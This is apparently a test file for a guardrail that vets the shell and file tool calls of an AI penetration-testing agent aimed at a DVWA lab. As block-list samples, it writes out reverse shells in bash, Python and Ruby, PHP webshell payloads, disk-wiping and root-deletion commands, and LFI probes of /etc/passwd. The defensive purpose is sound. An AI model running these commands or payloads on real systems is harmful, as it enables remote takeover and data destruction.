import { describe, expect, test } from "bun:test"
import { mkdtemp, rm, writeFile } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import {
    evaluateGuardrailToolCall,
    evaluateNetworkUrl,
    targetAllowsUrl,
} from "./guardrail-policy"
import type { HostGuardrailSettings } from "./types"

const enforceSettings: HostGuardrailSettings = {
    enabled: true,
    phase: "enforce",
}

describe("guardrail policy", () => {
    test("target allowlist matches same host and scoped path", () => {
        expect(targetAllowsUrl(["http://172.23.112.1/DVWA/"], "http://172.23.112.1/DVWA/vulnerabilities/sqli/?id=1")).toBe(true)
        expect(targetAllowsUrl(["http://172.23.112.1/DVWA/"], "http://172.23.112.1/login.php")).toBe(true)
        expect(targetAllowsUrl(["http://172.23.112.1/DVWA/"], "https://evil.example/DVWA/")).toBe(false)
    })

    test("target allowlist permits subdomains of an authorized hostname", () => {
        expect(targetAllowsUrl(["https://example.com/"], "https://www.example.com/path")).toBe(true)
        expect(targetAllowsUrl(["https://example.com/"], "https://api.example.com/path")).toBe(true)
        expect(targetAllowsUrl(["https://example.com/"], "https://evil.example.net/path")).toBe(false)
    })

    test("disabled guardrail allows traffic", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-disabled-"))
        try {
            const decision = await evaluateGuardrailToolCall("bash", { command: "rm -rf /" }, cwd, { enabled: false })
            expect(decision.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("dangerous write is blocked", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-write-"))
        try {
            const decision = await evaluateGuardrailToolCall("bash", { command: "rm -rf /" }, cwd, enforceSettings)
            expect(decision.allowed).toBe(false)
            expect(decision.ruleId).toBe("bash.dangerous_write")
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("unknown tools are blocked", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-unknown-"))
        try {
            const decision = await evaluateGuardrailToolCall("unknown_tool", {}, cwd, enforceSettings)
            expect(decision.allowed).toBe(false)
            expect(decision.ruleId).toBe("tool.not_allowed")
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("indirect script bodies are inspected", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-script-"))
        try {
            await writeFile(join(cwd, "exploit.py"), "import socket\ns=socket.socket()\ns.connect(('10.0.0.1',4444))\n", "utf8")
            const decision = await evaluateGuardrailToolCall("bash", { command: "python exploit.py" }, cwd, enforceSettings)
            expect(decision.allowed).toBe(false)
            expect(decision.ruleId).toContain("script.body")
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("workspace and sensitive file writes are blocked", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-file-"))
        try {
            const outside = await evaluateGuardrailToolCall("write", { path: "/tmp/outside.txt", content: "x" }, cwd, enforceSettings)
            expect(outside.allowed).toBe(false)
            expect(outside.ruleId).toBe("file.outside_workspace")

            const sensitive = await evaluateGuardrailToolCall("write", { path: "/etc/passwd", content: "x" }, cwd, enforceSettings)
            expect(sensitive.allowed).toBe(false)
            expect(sensitive.ruleId).toBe("file.sensitive_path")
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("reverse shell is blocked", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-shell-"))
        try {
            const decision = await evaluateGuardrailToolCall("bash", { command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" }, cwd, enforceSettings)
            expect(decision.allowed).toBe(false)
            expect(decision.ruleId).toBe("bash.reverse_shell")
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("sensitive read path is allowed", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-read-"))
        try {
            const decision = await evaluateGuardrailToolCall("read", { path: "/etc/passwd" }, cwd, enforceSettings)
            expect(decision.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("sensitive path mutation is blocked", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-sensitive-mutation-"))
        try {
            const decision = await evaluateGuardrailToolCall("bash", { command: "echo x > /etc/passwd" }, cwd, enforceSettings)
            expect(decision.allowed).toBe(false)
            expect(decision.ruleId).toBe("bash.sensitive_mutation")
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("workspace file mutation is not treated as sensitive", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-workspace-mutation-"))
        try {
            const command = `rm -f ${cwd.replace(/\\/g, "/")}/cookie.txt`
            const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
            expect(decision.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("webshell payload is blocked", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-webshell-"))
        try {
            const command = 'cat > pwn.php <<EOF\n<?php echo shell_exec($_GET["c"]); ?>\nEOF'
            const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
            expect(decision.allowed).toBe(false)
            expect(decision.ruleId).toBe("webshell_payload")
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("network target outside run policy is blocked", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-scope-"))
        try {
            await writeFile(
                join(cwd, "run-policy.json"),
                JSON.stringify({ allowed_targets: ["http://172.23.112.1/DVWA/"] }),
                "utf8",
            )
            const decision = await evaluateNetworkUrl(cwd, "https://evil.example/path", enforceSettings)
            expect(decision.allowed).toBe(false)
            expect(decision.ruleId).toBe("scope.out_of_scope_url")
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("workspace path followed by a shell separator is not sensitive", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-separator-"))
        try {
            const command = `cd ${cwd.replace(/\\/g, "/")}; rm -f cj.txt; curl -s http://host.docker.internal:8080/login.php`
            const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
            expect(decision.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("python inline code is not treated as an executed script path", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-inline-python-"))
        try {
            const command = `python3 -c "import requests;print(requests.get('http://host.docker.internal:8080/login.php',timeout=15).status_code)"`
            const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
            expect(decision.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("authorized target URL inside a python file body is allowed", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-file-body-"))
        try {
            await writeFile(
                join(cwd, "run-policy.json"),
                JSON.stringify({ allowed_targets: ["http://host.docker.internal:8080/"] }),
                "utf8",
            )
            const path = join(cwd, "t1.py").replace(/\\/g, "/")
            const content = [
                "import requests",
                'B="http://host.docker.internal:8080"',
                'r=requests.get(B+"/login.php",timeout=15)',
                'print(r.status_code)',
            ].join("\n")
            const decision = await evaluateGuardrailToolCall("write", { path, content }, cwd, enforceSettings)
            expect(decision.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("output sink to /dev/null and LFI URL parameters are not sensitive mutations", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-safe-output-"))
        try {
            const command = `cd ${cwd.replace(/\\/g, "/")} && curl -s -o /dev/null "http://host.docker.internal:8080/vulnerabilities/fi/?page=file:///etc/passwd"`
            const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
            expect(decision.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("workspace write combined with traversal-looking URL parameters is allowed", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-url-traversal-"))
        try {
            const command = `cd ${cwd.replace(/\\/g, "/")} && echo "hello" > test.php && curl -s --get --data-urlencode "page=../../etc/passwd" http://host.docker.internal:8080/vulnerabilities/fi/`
            const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
            expect(decision.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("deleting a sensitive path is still blocked", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-sensitive-delete-"))
        try {
            const decision = await evaluateGuardrailToolCall("bash", { command: "rm -f /etc/passwd" }, cwd, enforceSettings)
            expect(decision.allowed).toBe(false)
            expect(decision.ruleId).toBe("bash.sensitive_mutation")
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("python heredoc is not treated as an executed script path", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-python-heredoc-"))
        try {
            const command = `python3 - <<'EOF'\nimport requests\nprint('ok')\nEOF`
            const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
            expect(decision.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("websocket keyword does not trigger the python reverse shell rule", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-websocket-import-"))
        try {
            const command = `python3 -c "import importlib; print(importlib.util.find_spec('websocket'))"`
            const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
            expect(decision.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("real python reverse socket payload is still blocked", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-python-reverse-"))
        try {
            const command = `python3 -c "import socket;s=socket.socket();s.connect(('10.0.0.1',4444))"`
            const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
            expect(decision.allowed).toBe(false)
            expect(decision.ruleId).toBe("bash.reverse_shell")
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("loopback runtime URLs are not treated as out-of-scope targets", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-loopback-"))
        try {
            await writeFile(
                join(cwd, "run-policy.json"),
                JSON.stringify({ allowed_targets: ["http://host.docker.internal:8080/"] }),
                "utf8",
            )
            const command = `cd ${cwd.replace(/\\/g, "/")} && cat > cdp.js <<'JS'\nconst r = await fetch('http://127.0.0.1:9222/json/version')\nJS\nnode cdp.js`
            const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
            expect(decision.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("wrapper-prefixed dangerous commands are blocked", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-wrapper-"))
        try {
            for (const command of ["sudo mkfs.ext4 /dev/sda", "command mkfs.ext4 /dev/sda"]) {
                const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
                expect(decision.allowed).toBe(false)
                expect(decision.ruleId).toBe("bash.dangerous_write")
            }
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("root deletion and find delete are blocked", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-delete-"))
        try {
            for (const command of ["rm -rf -- /", "find / -delete", "find /etc -delete"]) {
                const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
                expect(decision.allowed).toBe(false)
                expect(decision.ruleId).toBe("bash.sensitive_mutation")
            }
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("dd is only blocked for dangerous device writes", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-dd-"))
        try {
            const benign = await evaluateGuardrailToolCall("bash", { command: "dd if=/dev/zero of=/tmp/test bs=1 count=1" }, cwd, enforceSettings)
            expect(benign.allowed).toBe(true)

            const block = await evaluateGuardrailToolCall("bash", { command: "dd if=/dev/zero of=/dev/sda bs=1M count=1" }, cwd, enforceSettings)
            expect(block.allowed).toBe(false)
            expect(block.ruleId).toBe("bash.dangerous_write")

            const nullSink = await evaluateGuardrailToolCall("bash", { command: "dd if=/dev/zero of=/dev/null bs=1M count=1" }, cwd, enforceSettings)
            expect(nullSink.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("ruby reverse shell is blocked", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-ruby-reverse-"))
        try {
            const command = `ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1",4444);exec("/bin/sh -i")'`
            const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
            expect(decision.allowed).toBe(false)
            expect(decision.ruleId).toBe("bash.reverse_shell")
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("additional php execution sinks are blocked", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-php-sinks-"))
        try {
            const commands = [
                `cat > p.php <<EOF\n<?php proc_open($_GET['c'], [], $pipes); ?>\nEOF`,
                `echo '<?php call_user_func($_GET[1]); ?>' > p.php`,
                `echo '<?php preg_replace("/.*/e",$_GET[1],""); ?>' > p.php`,
            ]
            for (const command of commands) {
                const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
                expect(decision.allowed).toBe(false)
                expect(decision.ruleId).toBe("webshell_payload")
            }
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("scheme-less targets are scope checked", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-bare-host-"))
        try {
            await writeFile(
                join(cwd, "run-policy.json"),
                JSON.stringify({ allowed_targets: ["http://host.docker.internal:8080/"] }),
                "utf8",
            )
            const outside = await evaluateGuardrailToolCall("bash", { command: "curl 10.0.0.8:8080/admin" }, cwd, enforceSettings)
            expect(outside.allowed).toBe(false)
            expect(outside.ruleId).toBe("scope.out_of_scope_command")

            const inside = await evaluateGuardrailToolCall("bash", { command: "curl host.docker.internal:8080/login.php" }, cwd, enforceSettings)
            expect(inside.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("redirection to /dev/null with fd duplication is allowed", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-fd-redirect-"))
        try {
            const command = `cd ${cwd.replace(/\\/g, "/")} && agent-browser open "http://host.docker.internal:8080/login.php" >/dev/null 2>&1`
            const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
            expect(decision.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("heredoc payload URLs are not treated as network targets", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-heredoc-payload-"))
        try {
            await writeFile(
                join(cwd, "run-policy.json"),
                JSON.stringify({ allowed_targets: ["http://host.docker.internal:8080/"] }),
                "utf8",
            )
            const command = `python3 - <<'EOF'\nbase="http://host.docker.internal:8080/"\ndata={"include":"https://pastebin.com/raw/AbCd1234"}\nprint(base, data)\nEOF`
            const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
            expect(decision.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })

    test("python subprocess Popen is not treated as a php webshell", async () => {
        const cwd = await mkdtemp(join(tmpdir(), "guardrail-python-popen-"))
        try {
            const command = `python3 - <<'EOF'\nimport subprocess\np=subprocess.Popen(['echo','ok'])\np.wait()\nEOF`
            const decision = await evaluateGuardrailToolCall("bash", { command }, cwd, enforceSettings)
            expect(decision.allowed).toBe(true)
        } finally {
            await rm(cwd, { recursive: true, force: true })
        }
    })
})
